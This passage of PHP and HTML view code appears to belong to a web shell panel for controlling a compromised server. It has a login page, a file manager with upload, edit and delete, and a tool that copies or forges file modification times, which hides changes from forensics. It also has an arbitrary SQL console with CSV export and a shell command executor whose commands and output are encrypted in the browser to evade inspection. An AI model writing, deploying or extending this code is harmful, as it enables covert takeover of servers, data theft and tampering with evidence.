    body {
      margin: 0;
      font-family: "Palatino Linotype", "Book Antiqua", Palatino, Georgia, serif;
      background: linear-gradient(120deg, var(--bg), var(--bg-2) 60%, #f9f7f2);
      color: var(--ink);
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      position: relative;
    }
    body::before {
      content: "";
      position: fixed;
      inset: 0;
      background-image:
        radial-gradient(circle at 20% 20%, rgba(194, 65, 12, 0.1), transparent 40%),
        radial-gradient(circle at 80% 10%, rgba(15, 118, 110, 0.12), transparent 45%);
      pointer-events: none;
    }
    .card {
      background: var(--card);
      padding: 28px;
      border-radius: 16px;
      width: 340px;
      border: 1px solid rgba(31, 41, 51, 0.08);
      box-shadow: 0 18px 36px rgba(31, 41, 51, 0.12);
      position: relative;
      z-index: 1;
    }
    h1 { margin-top: 0; font-size: 24px; letter-spacing: 0.4px; }
    label { display: block; margin-top: 12px; color: var(--muted); }
    input {
      width: 100%;
      padding: 10px 12px;
      border-radius: 8px;
      border: 1px solid #d2c7b9;
      margin-top: 6px;
      background: #fffdf9;
    }
    button {
      margin-top: 18px;
      width: 100%;
      padding: 10px 12px;
      background: linear-gradient(135deg, var(--accent), #f59e0b);
      border: none;
      border-radius: 8px;
      color: #fff;
      font-weight: 600;
      cursor: pointer;
    }
    .flash {
      margin-top: 12px;
      padding: 8px 10px;
      border-radius: 6px;
      background: #fef2f2;
      color: #b91c1c;
    }
  </style>
</head>
<body>
  <form class="card" method="post" action="<?php echo App::h(App::selfPath()); ?>">
    <input type="hidden" name="r" value="login">
    <h1>Sign in</h1>
    <label for="user">Username</label>
    <input id="user" name="user" type="text" required>
    <label for="pass">Password</label>
    <input id="pass" name="pass" type="password" required>
    <input type="hidden" name="csrf" value="<?php echo App::h($csrf); ?>">
    <button type="submit">Login</button>
    <?php if ($flash): ?>
      <div class="flash"><?php echo App::h($flash['msg']); ?></div>
    <?php endif; ?>
  </form>
</body>
</html>
    <?php
  }

  public static function dashboard() {
    $base = Files::base();
    $cfg = App::config();
    ob_start();
    ?>
    <div class="card">
      <div><strong>Base path:</strong> <?php echo App::h($base); ?></div>
      <div><strong>Crypto:</strong> <?php echo $cfg['crypto'] ? 'On' : 'Off'; ?></div>
      <div><strong>Command:</strong> <?php echo $cfg['enable_cmd'] ? 'Enabled' : 'Disabled'; ?></div>
      <div><strong>DB host:</strong> <?php echo App::h($cfg['db']['host']); ?></div>
    </div>
    <div class="card">
      <div class="muted">Use the sidebar to access modules.</div>
    </div>
    <?php
    return ob_get_clean();
  }

  public static function files($data) {
    $cwd = $data['cwd'];
    $items = $data['items'];
    $time = isset($data['time']) && is_array($data['time']) ? $data['time'] : ['target' => null, 'source' => null];
    $timeTarget = isset($time['target']) && is_array($time['target']) ? $time['target'] : null;
    $timeSource = isset($time['source']) && is_array($time['source']) ? $time['source'] : null;
    $edit = isset($data['edit']) && is_array($data['edit']) ? $data['edit'] : null;
    $csrf = App::csrfToken();
    $segments = $cwd === '' ? [] : explode('/', $cwd);
    $absoluteUnix = strpos($cwd, '/') === 0;
    $cwdDisplay = $cwd === '' ? Files::base() : $cwd;
    $selfPath = App::selfPath();
    $rootParams = ['r' => 'files'];
    if ($timeTarget) {
      $rootParams['time_target'] = App::enc($timeTarget['rel']);
    }
    if ($timeSource) {
      $rootParams['time_source'] = App::enc($timeSource['rel']);
    }
    $parentRel = Files::parentRel($cwd);
    $parentParams = $parentRel !== false ? ['r' => 'files', 'p' => App::enc($parentRel)] : null;
    if ($parentParams !== null && $timeTarget) {
      $parentParams['time_target'] = App::enc($timeTarget['rel']);
    }
    if ($parentParams !== null && $timeSource) {
      $parentParams['time_source'] = App::enc($timeSource['rel']);
    }
    $crumbs = [];
    $path = $absoluteUnix ? '/' : '';
    foreach ($segments as $seg) {
      if ($seg === '') {
        continue;
      }
      if ($path === '' && preg_match('/^[A-Za-z]:$/', $seg)) {
        $path = $seg;
      } else {
        $path = rtrim($path, '/') . '/' . $seg;
      }
      $params = ['r' => 'files', 'p' => App::enc($path)];
      if ($timeTarget) {
        $params['time_target'] = App::enc($timeTarget['rel']);
      }
      if ($timeSource) {
        $params['time_source'] = App::enc($timeSource['rel']);
      }
      $crumbs[] = ['name' => $seg, 'path' => $path, 'params' => $params];
    }
    ob_start();
    ?>
    <div class="card">
      <div class="path">
        <strong>Path:</strong>
        <form method="post" action="<?php echo App::h($selfPath); ?>" class="tag-form">
          <?php echo App::hiddenInputs($rootParams); ?>
          <button type="submit" class="path-link-btn">/</button>
        </form>
        <?php foreach ($crumbs as $crumb): ?>
          / <form method="post" action="<?php echo App::h($selfPath); ?>" class="tag-form">
            <?php echo App::hiddenInputs($crumb['params']); ?>
            <button type="submit" class="path-link-btn"><?php echo App::h($crumb['name']); ?></button>
          </form>
        <?php endforeach; ?>
        <?php if ($parentParams !== null): ?>
          <form method="post" action="<?php echo App::h($selfPath); ?>" class="tag-form" style="margin-left:10px;">
            <?php echo App::hiddenInputs($parentParams); ?>
            <button type="submit" class="tag-button">Up</button>
          </form>
        <?php endif; ?>
      </div>
      <div class="actions">
        <form method="post" action="<?php echo App::h($selfPath); ?>">
          <input type="hidden" name="r" value="files">
          <?php if ($timeTarget): ?>
            <input type="hidden" name="time_target" value="<?php echo App::h(App::enc($timeTarget['rel'])); ?>">
          <?php endif; ?>
          <?php if ($timeSource): ?>
            <input type="hidden" name="time_source" value="<?php echo App::h(App::enc($timeSource['rel'])); ?>">
          <?php endif; ?>
          <input type="text" name="path" value="<?php echo App::h($cwdDisplay); ?>" placeholder="Enter path">
          <button type="submit" class="secondary">Go</button>
        </form>
      </div>
      <div class="actions">
        <form method="post" action="<?php echo App::h($selfPath); ?>">
          <input type="hidden" name="r" value="files">
          <input type="hidden" name="action" value="mkdir">
          <input type="hidden" name="p" value="<?php echo App::h(App::enc($cwd)); ?>">
          <?php if ($timeTarget): ?>
            <input type="hidden" name="time_target" value="<?php echo App::h(App::enc($timeTarget['rel'])); ?>">
          <?php endif; ?>
          <?php if ($timeSource): ?>
            <input type="hidden" name="time_source" value="<?php echo App::h(App::enc($timeSource['rel'])); ?>">
          <?php endif; ?>
          <input type="hidden" name="csrf" value="<?php echo App::h($csrf); ?>">
          <input type="text" name="name" placeholder="New folder">
          <button type="submit">Create Folder</button>
        </form>
        <form method="post" action="<?php echo App::h($selfPath); ?>">
          <input type="hidden" name="r" value="files">
          <input type="hidden" name="action" value="touch">
          <input type="hidden" name="p" value="<?php echo App::h(App::enc($cwd)); ?>">
          <?php if ($timeTarget): ?>
            <input type="hidden" name="time_target" value="<?php echo App::h(App::enc($timeTarget['rel'])); ?>">
          <?php endif; ?>
          <?php if ($timeSource): ?>
            <input type="hidden" name="time_source" value="<?php echo App::h(App::enc($timeSource['rel'])); ?>">
          <?php endif; ?>
          <input type="hidden" name="csrf" value="<?php echo App::h($csrf); ?>">
          <input type="text" name="name" placeholder="New file">
          <button type="submit" class="secondary">Create File</button>
        </form>
        <form method="post" action="<?php echo App::h($selfPath); ?>" enctype="multipart/form-data">
          <input type="hidden" name="r" value="files">
          <input type="hidden" name="action" value="upload">
          <input type="hidden" name="p" value="<?php echo App::h(App::enc($cwd)); ?>">
          <?php if ($timeTarget): ?>
            <input type="hidden" name="time_target" value="<?php echo App::h(App::enc($timeTarget['rel'])); ?>">
          <?php endif; ?>
          <?php if ($timeSource): ?>
            <input type="hidden" name="time_source" value="<?php echo App::h(App::enc($timeSource['rel'])); ?>">
          <?php endif; ?>
          <input type="hidden" name="csrf" value="<?php echo App::h($csrf); ?>">
          <input type="file" name="upload">
          <button type="submit">Upload</button>
        </form>
      </div>
    </div>
    <?php if ($edit): ?>
      <?php
        $editFile = isset($edit['file']) ? (string)$edit['file'] : '';
        $editContent = isset($edit['content']) ? (string)$edit['content'] : '';
        $editBaseParams = ['r' => 'files', 'p' => App::enc($cwd)];
        if ($timeTarget) {
          $editBaseParams['time_target'] = App::enc($timeTarget['rel']);
        }
        if ($timeSource) {
          $editBaseParams['time_source'] = App::enc($timeSource['rel']);
        }
        $editSaveParams = $editBaseParams;
        $editSaveParams['action'] = 'save_edit';
        $editSaveParams['file'] = App::enc($editFile);
        $editSaveParams['csrf'] = $csrf;
      ?>
      <div class="file-edit-backdrop" role="dialog" aria-modal="true" aria-labelledby="file-edit-title">
        <div class="file-edit-modal">
          <div class="file-edit-header">
            <div class="file-edit-title" id="file-edit-title">Editing file</div>
            <div class="file-edit-path"><?php echo App::h($editFile); ?></div>
          </div>
          <form method="post" action="<?php echo App::h($selfPath); ?>" id="file-edit-save-form" class="file-edit-form">
            <?php echo App::hiddenInputs($editSaveParams); ?>
            <input type="hidden" name="content_enc" id="file-edit-content-enc" value="<?php echo App::h(Crypto::enc($editContent)); ?>">
            <textarea id="file-edit-content" aria-label="File content"></textarea>
            <noscript>
              <div class="flash error" style="margin:12px 16px;">JavaScript required to edit encrypted content.</div>
            </noscript>
          </form>
          <form method="post" action="<?php echo App::h($selfPath); ?>" id="file-edit-cancel-form" class="file-edit-cancel-form">
            <?php echo App::hiddenInputs($editBaseParams); ?>
          </form>
          <div class="actions file-edit-actions">
            <button type="submit" form="file-edit-save-form">Save</button>
            <button type="submit" form="file-edit-cancel-form" class="secondary">Cancel</button>
          </div>
        </div>
      </div>
      <script>
        (function () {
          var textarea = document.getElementById('file-edit-content');
          var encInput = document.getElementById('file-edit-content-enc');
          var form = document.getElementById('file-edit-save-form');
          var crypto = window.fmCrypto;
          if (!textarea || !encInput || !crypto) {
            return;
          }
          try {
            textarea.value = crypto.dec(encInput.value);
          } catch (e) {
            textarea.value = '';
          }
          if (form) {
            form.addEventListener('submit', function () {
              encInput.value = crypto.enc(textarea.value);
            });
          }
          setTimeout(function () {
            textarea.focus();
          }, 0);
        })();
      </script>
    <?php endif; ?>
    <?php if ($timeTarget): ?>
      <?php
        $targetTimeValue = '';
        if (isset($timeTarget['mtime']) && $timeTarget['mtime'] !== null) {
          $targetTimeValue = date('Y-m-d\TH:i', (int)$timeTarget['mtime']);
        }
        $copyParams = ['r' => 'files', 'p' => App::enc($cwd), 'time_target' => App::enc($timeTarget['rel'])];
      ?>
      <div class="card">
        <div class="time-panel">
          <div>
            <div class="time-box">
              <strong>Editing Time</strong>
              <div><?php echo App::h($timeTarget['name']); ?> <span class="tag"><?php echo $timeTarget['is_dir'] ? 'Folder' : 'File'; ?></span></div>
              <div class="time-meta">
                Current: <?php echo isset($timeTarget['mtime']) && $timeTarget['mtime'] !== null ? App::h(date('Y-m-d H:i:s', (int)$timeTarget['mtime'])) : '-'; ?><br>
                Path: <?php echo App::h($timeTarget['rel']); ?>
              </div>
            </div>
            <form method="post" action="<?php echo App::h($selfPath); ?>" class="actions">
              <input type="hidden" name="r" value="files">
              <input type="hidden" name="action" value="set_time_manual">
              <input type="hidden" name="p" value="<?php echo App::h(App::enc($cwd)); ?>">
              <input type="hidden" name="target" value="<?php echo App::h(App::enc($timeTarget['rel'])); ?>">
              <?php if ($timeSource): ?>
                <input type="hidden" name="time_source" value="<?php echo App::h(App::enc($timeSource['rel'])); ?>">
              <?php endif; ?>
              <input type="hidden" name="csrf" value="<?php echo App::h($csrf); ?>">
              <label>Set time manually</label>
              <input type="datetime-local" name="mtime" value="<?php echo App::h($targetTimeValue); ?>" step="1">
              <button type="submit">Apply Time</button>
            </form>
          </div>
          <div>
            <div class="time-box">
              <strong>Copy From Target</strong>
              <?php if ($timeSource): ?>
                <div><?php echo App::h($timeSource['name']); ?> <span class="tag"><?php echo $timeSource['is_dir'] ? 'Folder' : 'File'; ?></span></div>
                <div class="time-meta">
                  Source time: <?php echo isset($timeSource['mtime']) && $timeSource['mtime'] !== null ? App::h(date('Y-m-d H:i:s', (int)$timeSource['mtime'])) : '-'; ?><br>
                  Path: <?php echo App::h($timeSource['rel']); ?>
                </div>
              <?php else: ?>
                <div class="muted">Select a file or folder below with "Use as source".</div>
              <?php endif; ?>
            </div>
            <div class="actions">
              <form method="post" action="<?php echo App::h($selfPath); ?>">
              <input type="hidden" name="r" value="files">
              <input type="hidden" name="action" value="set_time_copy">
              <input type="hidden" name="p" value="<?php echo App::h(App::enc($cwd)); ?>">
              <input type="hidden" name="target" value="<?php echo App::h(App::enc($timeTarget['rel'])); ?>">
              <?php if ($timeSource): ?>
                <input type="hidden" name="time_source" value="<?php echo App::h(App::enc($timeSource['rel'])); ?>">
              <?php endif; ?>
              <input type="hidden" name="csrf" value="<?php echo App::h($csrf); ?>">
              <button type="submit" <?php echo $timeSource ? '' : 'disabled'; ?>>Copy Source Time</button>
              </form>
              <form method="post" action="<?php echo App::h($selfPath); ?>" class="tag-form">
                <?php echo App::hiddenInputs($copyParams); ?>
                <button type="submit" class="tag-button">Keep target only</button>
              </form>
            </div>
            <div class="muted" style="margin-top:10px;">Browse folders and click "Use as source" on any file or folder to follow its time.</div>
          </div>
        </div>
      </div>
    <?php endif; ?>
    <div class="card">
      <form method="post" action="<?php echo App::h($selfPath); ?>" id="batch-delete-form" onsubmit="return confirmBatchDelete();">
        <input type="hidden" name="r" value="files">
        <input type="hidden" name="action" value="batch_delete">
        <input type="hidden" name="p" value="<?php echo App::h(App::enc($cwd)); ?>">
        <?php if ($timeTarget): ?>
          <input type="hidden" name="time_target" value="<?php echo App::h(App::enc($timeTarget['rel'])); ?>">
        <?php endif; ?>
        <?php if ($timeSource): ?>
          <input type="hidden" name="time_source" value="<?php echo App::h(App::enc($timeSource['rel'])); ?>">
        <?php endif; ?>
        <input type="hidden" name="csrf" value="<?php echo App::h($csrf); ?>">
      </form>
      <div class="actions" style="margin-bottom:10px;">
        <button type="button" class="secondary" onclick="toggleAllCheckboxes(this)">Select All</button>
        <button type="submit" form="batch-delete-form" class="secondary" style="background: linear-gradient(135deg, #b91c1c, #7f1a1a);">Delete Selected</button>
      </div>
      <table>
        <thead>
          <tr>
            <th style="width:30px;"><input type="checkbox" id="select-all-checkbox" onclick="toggleAllCheckboxes(this)"></th>
            <th>Name</th>
            <th>Type</th>
            <th>Size</th>
            <th>Modified</th>
            <th>Actions</th>
          </tr>
        </thead>
        <tbody>
        <?php if (empty($items)): ?>
          <tr><td colspan="6" class="muted">Empty directory.</td></tr>
        <?php else: ?>
          <?php foreach ($items as $item): ?>
            <?php
              $isTimeTarget = $timeTarget && $item['rel'] === $timeTarget['rel'];
              $isTimeSource = $timeSource && $item['rel'] === $timeSource['rel'];
              $rowClass = $isTimeTarget ? 'time-row-active' : ($isTimeSource ? 'time-row-source' : '');
              $timeParams = ['r' => 'files', 'p' => App::enc($cwd), 'time_target' => App::enc($item['rel'])];
              $editParams = ['r' => 'files', 'action' => 'edit', 'p' => App::enc($cwd), 'file' => App::enc($item['rel']), 'csrf' => $csrf];
              $renameParams = ['r' => 'files', 'action' => 'rename', 'p' => App::enc($cwd), 'target' => App::enc($item['rel']), 'csrf' => $csrf];
              $sourceParams = ['r' => 'files', 'p' => App::enc($cwd)];
              if ($timeTarget) {
                $editParams['time_target'] = App::enc($timeTarget['rel']);
                $renameParams['time_target'] = App::enc($timeTarget['rel']);
              }
              if ($timeSource) {
                $editParams['time_source'] = App::enc($timeSource['rel']);
                $renameParams['time_source'] = App::enc($timeSource['rel']);
              }
              if ($timeTarget) {
                $sourceParams['time_target'] = App::enc($timeTarget['rel']);
                $sourceParams['time_source'] = App::enc($item['rel']);
              }
            ?>
            <tr class="<?php echo App::h($rowClass); ?>">
              <td>
                <input
                  type="checkbox"
                  form="batch-delete-form"
                  name="selected[]"
                  value="<?php echo App::h(App::enc($item['rel'])); ?>"
                  data-item-name="<?php echo App::h($item['name']); ?>"
                  data-item-path="<?php echo App::h($item['rel']); ?>"
                  data-item-type="<?php echo App::h($item['is_dir'] ? 'Folder' : 'File'); ?>"
                >
              </td>
              <td>
                <?php if ($item['is_dir']): ?>
                  <?php
                    $folderParams = ['r' => 'files', 'p' => App::enc($item['rel'])];
                    if ($timeTarget) {
                      $folderParams['time_target'] = App::enc($timeTarget['rel']);
                    }
                    if ($timeSource) {
                      $folderParams['time_source'] = App::enc($timeSource['rel']);
                    }
                  ?>
                  <form method="post" action="<?php echo App::h($selfPath); ?>" class="tag-form">
                    <?php echo App::hiddenInputs($folderParams); ?>
                    <button type="submit" class="path-link-btn"><?php echo App::h($item['name']); ?></button>
                  </form>
                <?php else: ?>
                  <?php echo App::h($item['name']); ?>
                <?php endif; ?>
              </td>
              <td><?php echo $item['is_dir'] ? 'Dir' : 'File'; ?></td>
              <td><?php echo $item['is_dir'] ? '-' : number_format($item['size']); ?></td>
              <td><?php echo $item['mtime'] ? date('Y-m-d H:i', $item['mtime']) : '-'; ?></td>
              <td class="actions">
                <div class="table-actions">
                  <?php if (!$item['is_dir']): ?>
                    <form method="post" action="<?php echo App::h($selfPath); ?>" class="inline-post">
                      <?php echo App::hiddenInputs($editParams); ?>
                      <button type="submit" class="tag-button">Edit</button>
                    </form>
                    <form method="post" action="<?php echo App::h($selfPath); ?>" class="inline-post">
                      <?php echo App::hiddenInputs(['r' => 'files', 'action' => 'download', 'file' => App::enc($item['rel']), 'p' => App::enc($cwd)]); ?>
                      <button type="submit" class="tag-button">Download</button>
                    </form>
                  <?php endif; ?>
                  <form method="post" action="<?php echo App::h($selfPath); ?>" class="inline-post" data-current-name="<?php echo App::h($item['name']); ?>" onsubmit="return promptRename(this);">
                    <?php echo App::hiddenInputs($renameParams); ?>
                    <input type="hidden" name="new_name" value="">
                    <button type="submit" class="tag-button">Rename</button>
                  </form>
                  <form method="post" action="<?php echo App::h($selfPath); ?>" class="inline-post">
                    <?php echo App::hiddenInputs($timeParams); ?>
                    <button type="submit" class="tag-button">Time</button>
                  </form>
                  <?php if ($timeTarget && !$isTimeTarget): ?>
                    <form method="post" action="<?php echo App::h($selfPath); ?>" class="inline-post">
                      <?php echo App::hiddenInputs($sourceParams); ?>
                      <button type="submit" class="tag-button">Use as source</button>
                    </form>
                  <?php endif; ?>
                  <form method="post" action="<?php echo App::h($selfPath); ?>" style="display:inline;" onsubmit="return confirm(this.dataset.confirmMessage || 'Confirm delete?');" data-confirm-message="<?php echo App::h(($item['is_dir'] ? 'Delete this folder and all of its contents?' : 'Delete this file?') . "\n\nName: " . $item['name'] . "\nPath: " . $item['rel']); ?>">
                    <input type="hidden" name="r" value="files">
                    <input type="hidden" name="action" value="delete">
                    <input type="hidden" name="p" value="<?php echo App::h(App::enc($cwd)); ?>">
                    <input type="hidden" name="target" value="<?php echo App::h(App::enc($item['rel'])); ?>">
                    <?php if ($timeTarget): ?>
                      <input type="hidden" name="time_target" value="<?php echo App::h(App::enc($timeTarget['rel'])); ?>">
                    <?php endif; ?>
                    <?php if ($timeSource): ?>
                      <input type="hidden" name="time_source" value="<?php echo App::h(App::enc($timeSource['rel'])); ?>">
                    <?php endif; ?>
                    <input type="hidden" name="csrf" value="<?php echo App::h($csrf); ?>">
                    <button type="submit" class="secondary">Delete</button>
                  </form>
                </div>
              </td>
            </tr>
          <?php endforeach; ?>
        <?php endif; ?>
        </tbody>
      </table>
    </div>
    <script>
      function promptRename(form) {
        var currentName = form.getAttribute('data-current-name') || '';
        var input = form.querySelector('input[name="new_name"]');
        if (!input) {
          return false;
        }
        var nextName = prompt('New name:', currentName);
        if (nextName === null) {
          return false;
        }
        nextName = nextName.trim();
        if (nextName === '' || nextName === currentName) {
          return false;
        }
        if (nextName.indexOf('/') !== -1 || nextName.indexOf('\\') !== -1) {
          alert('Name cannot contain slashes.');
          return false;
        }
        input.value = nextName;
        return true;
      }
      function getBatchDeleteCheckboxes() {
        return document.querySelectorAll('input[type="checkbox"][name="selected[]"][form="batch-delete-form"]');
      }
      function syncBatchDeleteSelectAll() {
        var checkboxes = Array.from(getBatchDeleteCheckboxes());
        var selectAllChk = document.getElementById('select-all-checkbox');
        if (!selectAllChk) {
          return;
        }
        selectAllChk.checked = checkboxes.length > 0 && checkboxes.every(function (cb) { return cb.checked; });
      }
      function toggleAllCheckboxes(btnOrCheckbox) {
        var isButton = btnOrCheckbox.tagName === 'BUTTON';
        var checkboxes = getBatchDeleteCheckboxes();
        var selectAllChk = document.getElementById('select-all-checkbox');
        var newState;
        if (isButton) {
          var allChecked = Array.from(checkboxes).every(cb => cb.checked);
          newState = !allChecked;
          if (selectAllChk) selectAllChk.checked = newState;
        } else {
          newState = btnOrCheckbox.checked;
        }
        for (var i = 0; i < checkboxes.length; i++) {
          if (isButton) checkboxes[i].checked = newState;
          else if (btnOrCheckbox === selectAllChk) checkboxes[i].checked = newState;
        }
        syncBatchDeleteSelectAll();
      }
      function confirmBatchDelete() {
        var checkboxes = document.querySelectorAll('input[type="checkbox"][name="selected[]"][form="batch-delete-form"]:checked');
        if (checkboxes.length === 0) {
          alert('No items selected.');
          return false;
        }
        var lines = [];
        var limit = 20;
        for (var i = 0; i < checkboxes.length && i < limit; i++) {
          var checkbox = checkboxes[i];
          var type = checkbox.getAttribute('data-item-type') || 'Item';
          var path = checkbox.getAttribute('data-item-path') || checkbox.getAttribute('data-item-name') || '(unknown)';
          lines.push('- ' + type + ': ' + path);
        }
        if (checkboxes.length > limit) {
          lines.push('- ... and ' + (checkboxes.length - limit) + ' more item(s)');
        }
        var msg = 'Are you sure you want to delete the selected ' + checkboxes.length + ' item(s)?\nThis action cannot be undone.\n\nSelected:\n' + lines.join('\n');
        return confirm(msg);
      }
      document.addEventListener('change', function (event) {
        var target = event.target;
        if (target && target.matches('input[type="checkbox"][name="selected[]"][form="batch-delete-form"]')) {
          syncBatchDeleteSelectAll();
        }
      });
    </script>
    <?php
    return ob_get_clean();
  }

  public static function editor($data) {
    $csrf = App::csrfToken();
    $file = $data['file'];
    $contentEnc = Crypto::enc($data['content']);
    $selfPath = App::selfPath();
    ob_start();
    ?>
    <div class="card">
      <?php if ($data['error'] !== ''): ?>
        <div class="flash error"><?php echo App::h($data['error']); ?></div>
      <?php else: ?>
        <div class="path"><strong>File:</strong> <?php echo App::h($file); ?></div>
        <form method="post" action="<?php echo App::h($selfPath); ?>">
          <input type="hidden" name="r" value="editor">
          <input type="hidden" name="action" value="save">
          <input type="hidden" name="file" value="<?php echo App::h(App::enc($file)); ?>">
          <input type="hidden" name="csrf" value="<?php echo App::h($csrf); ?>">
          <input type="hidden" name="content_enc" id="editor-content-enc" value="<?php echo App::h($contentEnc); ?>">
          <textarea id="editor-content" aria-label="File content"></textarea>
          <div class="actions" style="margin-top:10px;">
            <button type="submit">Save</button>
          </div>
          <noscript>
            <div class="flash error" style="margin-top:12px;">JavaScript required to edit encrypted content.</div>
          </noscript>
        </form>
        <script>
          (function () {
            var textarea = document.getElementById('editor-content');
            var encInput = document.getElementById('editor-content-enc');
            var crypto = window.fmCrypto;
            if (!textarea || !encInput || !crypto) {
              return;
            }
            try {
              textarea.value = crypto.dec(encInput.value);
            } catch (e) {
              textarea.value = '';
            }
            if (textarea.form) {
              textarea.form.addEventListener('submit', function () {
                encInput.value = crypto.enc(textarea.value);
              });
            }
          })();
        </script>
      <?php endif; ?>
    </div>
    <?php
    return ob_get_clean();
  }

  public static function db($data) {
    $csrf = App::csrfToken();
    $cfg = $data['cfg'];
    $selfPath = App::selfPath();
    ob_start();
    ?>
    <div class="card">
      <form method="post" action="<?php echo App::h($selfPath); ?>" class="actions">
        <input type="hidden" name="r" value="db">
        <input type="hidden" name="csrf" value="<?php echo App::h($csrf); ?>">
        <input type="text" name="host" value="<?php echo App::h($cfg['host']); ?>" placeholder="Host">
        <input type="text" name="port" value="<?php echo App::h((string)$cfg['port']); ?>" placeholder="Port">
        <input type="text" name="user" value="<?php echo App::h($cfg['user']); ?>" placeholder="User">
        <input type="password" name="pass" placeholder="Password (leave blank to keep)">
        <input type="text" name="name" value="<?php echo App::h($cfg['name']); ?>" placeholder="Database">
        <button type="submit" name="action" value="connect">Connect</button>
        <button type="submit" name="action" value="disconnect" class="secondary">Disconnect</button>
      </form>
    </div>
    <div class="card">
      <?php if (!$data['enabled']): ?>
        <div class="flash error"><?php echo App::h($data['error']); ?></div>
      <?php else: ?>
        <?php if ($data['error'] !== ''): ?>
          <div class="flash error"><?php echo App::h($data['error']); ?></div>
        <?php endif; ?>
        <div class="actions">
          <form method="post" action="<?php echo App::h($selfPath); ?>">
            <input type="hidden" name="r" value="db">
            <input type="hidden" name="csrf" value="<?php echo App::h($csrf); ?>">
            <label>Database</label>
            <select name="db">
              <?php foreach ($data['dbs'] as $db): ?>
                <option value="<?php echo App::h(App::enc($db)); ?>" <?php echo $db === $data['db'] ? 'selected' : ''; ?>>
                  <?php echo App::h($db); ?>
                </option>
              <?php endforeach; ?>
            </select>
            <label>Table</label>
            <select name="table">
              <?php foreach ($data['tables'] as $table): ?>
                <option value="<?php echo App::h(App::enc($table)); ?>" <?php echo $table === $data['table'] ? 'selected' : ''; ?>>
                  <?php echo App::h($table); ?>
                </option>
              <?php endforeach; ?>
            </select>
            <button type="submit">Load</button>
          </form>
          <?php if ($data['db'] !== '' && $data['table'] !== ''): ?>
            <form method="post" action="<?php echo App::h($selfPath); ?>" class="tag-form">
              <?php echo App::hiddenInputs(['r' => 'db', 'action' => 'export', 'db' => App::enc($data['db']), 'table' => App::enc($data['table']), 'csrf' => $csrf]); ?>
              <button type="submit" class="tag-button">Export CSV</button>
            </form>
          <?php endif; ?>
        </div>
      <?php endif; ?>
    </div>
    <div class="card">
      <form method="post" action="<?php echo App::h($selfPath); ?>">
        <input type="hidden" name="r" value="db">
        <input type="hidden" name="action" value="sql">
        <input type="hidden" name="db" value="<?php echo App::h(App::enc($data['db'])); ?>">
        <input type="hidden" name="table" value="<?php echo App::h(App::enc($data['table'])); ?>">
        <input type="hidden" name="csrf" value="<?php echo App::h($csrf); ?>">
        <label>SQL</label>
        <textarea name="sql" rows="6"><?php echo App::h($data['sql']); ?></textarea>
        <div class="actions" style="margin-top:10px;">
          <button type="submit">Run SQL</button>
        </div>
      </form>
      <?php if ($data['sql_error'] !== ''): ?>
        <div class="flash error"><?php echo App::h($data['sql_error']); ?></div>
      <?php elseif (is_array($data['sql_result'])): ?>
        <?php if ($data['sql_result']['type'] === 'exec'): ?>
          <div class="flash info">Rows affected: <?php echo App::h((string)$data['sql_result']['count']); ?></div>
        <?php elseif ($data['sql_result']['type'] === 'select'): ?>
          <div class="flash info">Rows: <?php echo count($data['sql_result']['rows']); ?></div>
          <?php if (!empty($data['sql_result']['rows'])): ?>
            <pre><?php echo App::h(json_encode($data['sql_result']['rows'], JSON_PRETTY_PRINT)); ?></pre>
          <?php endif; ?>
        <?php endif; ?>
      <?php endif; ?>
    </div>
    <?php if (!empty($data['rows'])): ?>
      <div class="card">
        <details class="collapse" <?php echo $data['sql_ran'] ? '' : 'open'; ?>>
          <summary>Table preview (<?php echo count($data['rows']); ?> rows)</summary>
          <table>
            <thead>
              <tr>
                <?php foreach (array_keys($data['rows'][0]) as $col): ?>
                  <th><?php echo App::h($col); ?></th>
                <?php endforeach; ?>
              </tr>
            </thead>
            <tbody>
              <?php foreach ($data['rows'] as $row): ?>
                <tr>
                  <?php foreach ($row as $val): ?>
                    <td><?php echo App::h((string)$val); ?></td>
                  <?php endforeach; ?>
                </tr>
              <?php endforeach; ?>
            </tbody>
          </table>
        </details>
      </div>
    <?php endif; ?>
    <?php
    return ob_get_clean();
  }

  public static function cmd($data) {
    $csrf = App::csrfToken();
    $cmdEnc = Crypto::enc($data['cmd']);
    $outputEnc = $data['output'] !== '' ? Crypto::enc($data['output']) : '';
    $selfPath = App::selfPath();
    ob_start();
    ?>
    <div class="card">
      <?php if (!$data['enabled']): ?>
        <div class="muted">Command module disabled.</div>
      <?php elseif ($data['error'] !== ''): ?>
        <div class="flash error"><?php echo App::h($data['error']); ?></div>
      <?php endif; ?>
      <?php if ($data['enabled'] && $data['supported']): ?>
        <div class="muted" style="margin-bottom:8px;">
          Available methods: <?php echo App::h(implode(', ', $data['methods'])); ?>
        </div>
        <form method="post" action="<?php echo App::h($selfPath); ?>">
          <input type="hidden" name="r" value="cmd">
          <input type="hidden" name="action" value="run">
          <input type="hidden" name="csrf" value="<?php echo App::h($csrf); ?>">
          <input type="hidden" name="cmd_enc" id="cmd-enc" value="<?php echo App::h($cmdEnc); ?>">
          <input type="text" id="cmd-input" placeholder="Command" aria-label="Command" style="width: 2048px;max-width: 100%;min-height: 124px;padding: 10px 12px;">
          <button type="submit">Execute</button>
        </form>
        <noscript>
          <div class="flash error" style="margin-top:12px;">JavaScript required to submit encrypted commands.</div>
        </noscript>
      <?php endif; ?>
      <?php if ($data['method'] !== ''): ?>
        <div style="margin-top:12px;">
          <div class="muted">Method: <?php echo App::h($data['method']); ?></div>
          <div class="muted">Exit code: <?php echo App::h((string)$data['exit_code']); ?></div>
          <?php if ($outputEnc !== ''): ?>
            <pre id="cmd-output" data-enc="<?php echo App::h($outputEnc); ?>"></pre>
          <?php endif; ?>
        </div>
      <?php endif; ?>
    </div>
    <script>
      (function () {
        var crypto = window.fmCrypto;
        var cmdInput = document.getElementById('cmd-input');
        var cmdEnc = document.getElementById('cmd-enc');
        if (cmdInput && cmdEnc && crypto) {
          try {
            cmdInput.value = crypto.dec(cmdEnc.value);
          } catch (e) {
            cmdInput.value = '';
          }
          if (cmdInput.form) {
            cmdInput.form.addEventListener('submit', function () {
              cmdEnc.value = crypto.enc(cmdInput.value);
            });
          }
        }
        var outputEl = document.getElementById('cmd-output');
        if (outputEl && outputEl.dataset.enc && crypto) {
          try {
            outputEl.textContent = crypto.dec(outputEl.dataset.enc);
          } catch (e) {
            outputEl.textContent = '';
          }
        }
      })();
    </script>
    <?php
    return ob_get_clean();
  }

  public static function php($data) {
    $csrf = App::csrfToken();
    $codeEnc = Crypto::enc($data['code']);
    $outputEnc = $data['output'] !== '' ? Crypto::enc($data['output']) : '';
